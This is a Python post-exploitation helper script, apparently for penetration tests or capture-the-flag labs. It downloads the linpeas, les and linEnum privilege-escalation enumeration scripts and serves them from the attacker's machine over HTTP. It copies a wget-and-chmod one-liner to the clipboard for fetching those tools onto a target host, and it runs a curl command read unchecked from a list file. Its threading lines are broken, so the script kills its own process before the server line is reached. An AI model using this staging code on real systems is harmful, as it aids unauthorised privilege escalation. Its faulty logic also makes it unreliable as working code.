#! /usr/bin/env python3

import requests
import os
import sys, time #for the progress bar
import http.server
import socketserver
import subprocess
import threading
import colorama
from colorama import Fore, Back
from colorama import Style


#Variables

port = "9000"
lhost = str(os.popen('ip addr show wlan0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip())
current_path = os.getcwd()
scripts=[]
script_path = os.path.abspath(os.path.dirname(__file__))
pid = os.getpid()

#WEB SERVER
handler = http.server.SimpleHTTPRequestHandler


#Function

#Open list file of script's name and url

def listing():
    liste = open(script_path + "/scripts.txt", "r")
    for line in liste :
        scripts.append(line)

#Download a script

def script_download(name, url) :
    local_script = current_path + "/" + name
    r = requests.get(url)
    with open(local_script, 'wb') as file:
        if (r.status_code == 200) :
            file.write(r.content)
        else :
            return False



#HTTP server

def http_server() : 
    print("\n3. Web server is starting...\n")
    with socketserver.TCPServer(("", int(port)), handler) as httpd:
    
        print("Web Server is running at http://" + lhost + ":%s" %port)
    
        httpd.serve_forever()

#Clipoard function

def set_clipboard_data(data):
    data = bytes(data, "utf-8")
    p = subprocess.Popen(["xclip", "-selection", "clipboard"], stdin=subprocess.PIPE)
    p.stdin.write(data)
    p.stdin.close()
    retcode = p.wait()

#Progress BAR

def progressBar (count, total, suffix=''):
    barlenght = 60
    filledLEnght = int(round(barlenght * count /float(total)))

    percent = round(100.0 * count / float(total), 1)
    bar = '=' * filledLEnght + '-' * (barlenght - filledLEnght)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percent, '%', suffix))
    sys.stdout.flush()



#SCRIPT

print("\n")
print("Local Enumeration Facilities - LEF \n\n")
print("Just a script to make live " + Fore.LIGHTRED_EX + "easy" + Style.RESET_ALL + " and " + Fore.LIGHTBLUE_EX + "faster" + Style.RESET_ALL + ".\n")
print("--------------------------------------------------------------------------------------------------------------")
print("\n1. Copy of known scripts : linpeas.sh, les.sh, linEnum.sh (For the moment...) in the current directory\n")
print("Opening list....")
listing()
#print(scripts)
print("2. " +Fore.LIGHTCYAN_EX + str(len(scripts)) + Style.RESET_ALL + " scripts to download...")
pb = 1

#Downloads updated versions
for script in scripts : 
    info = script.split(",")
    sys.stdout.write("Copying " +Fore.GREEN + info[0] + Style.RESET_ALL + " in local folder...")
    try :
        script_download(info[0], info[1])
        # progressBar(pb, len(scripts))
    except :
        print(Fore.RED + info[0] + Style.RESET_ALL + " was " + Back.RED + Fore.WHITE + "not" + Style.RESET_ALL + " copied")
        print("Try with system command curl...")
        if (os.system(info[2])):
            print("curl command succeed.")
    
    progressBar(pb, len(scripts))
    time.sleep(0.5)
    pb = pb + 1
if pb >= 3: 
    sys.stdout.write(Fore.GREEN + "All scripts succeffully copied!\n" + Style.RESET_ALL)

#TO DO : Automate command process
cl = f"wget http://{lhost}:{port}/linpeas.sh && wget http://{lhost}:{port}/les.sh && wget http://{lhost}:{port}/linEnum.sh && chmod +x linpeas.sh les.sh linEnum.sh"
set_clipboard_data(cl)

#print(pid)
t1 = threading.Thread(time.sleep(10), os.system("kill " + str(pid)))
t2 = threading.Thread(os.system("python3 -m http.server 9000"))

